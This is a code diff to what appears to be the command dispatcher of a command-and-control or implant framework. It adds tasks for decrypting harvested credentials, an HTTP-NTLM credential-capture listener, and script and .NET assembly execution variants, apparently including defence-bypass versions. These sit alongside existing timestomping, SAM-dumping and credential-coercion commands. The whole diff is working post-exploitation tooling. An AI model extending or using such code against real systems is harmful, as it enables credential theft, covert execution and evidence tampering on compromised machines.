@@ -85,6 +85,8 @@ def _build_task(session: Session, command: str, cmd_id: str,
         return _bt("timestomp_set", {"target": parts[0], "timestamp": parts[1] if len(parts) > 1 else ""})
     if command == "CREDS_HARVEST":
         return _bt("creds_harvest", {})
+    if command == "CREDS_HARVEST_DECRYPT":
+        return _bt("creds_harvest", {"decrypt": True})
     if command == "CREDS_COERCE":
         return _bt("creds_coerce", {})
     if command == "CREDS_SAM":
@@ -95,7 +97,7 @@ def _build_task(session: Session, command: str, cmd_id: str,
         parts = command.split(":")
         if len(parts) >= 2:
             # Format: CREDS_LISTEN_START:proto:port  (e.g. CREDS_LISTEN_START:http:80)
-            proto = parts[1] if parts[1] in ("smb", "http") else "smb"
+            proto = parts[1] if parts[1] in ("smb", "http", "http-ntlm") else "smb"
         if len(parts) >= 3:
             try: port = int(parts[2])
             except ValueError: pass
@@ -114,9 +116,18 @@ def _build_task(session: Session, command: str, cmd_id: str,
     if command.startswith("ASSEMBLY_EXEC:"):
         parts = command[14:].split(":", 1)
         return _bt("assembly_exec", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
+    if command.startswith("ASSEMBLY_EXEC_AB:"):
+        parts = command[17:].split(":", 1)
+        return _bt("assembly_exec_ab", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
     if command.startswith("MEMEXEC:"):
         parts = command[8:].split(":", 1)
         return _bt("memexec", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
+    if command.startswith("SCRIPT_EXEC:"):
+        parts = command[12:].split(":", 1)
+        return _bt("script_exec", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
+    if command.startswith("SCRIPT_EXEC_AB:"):
+        parts = command[15:].split(":", 1)
+        return _bt("script_exec_ab", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
     if command.startswith("BLOBSAVE:"):
         parts = command[9:].split(":", 2)
         return _bt("blobsave", {
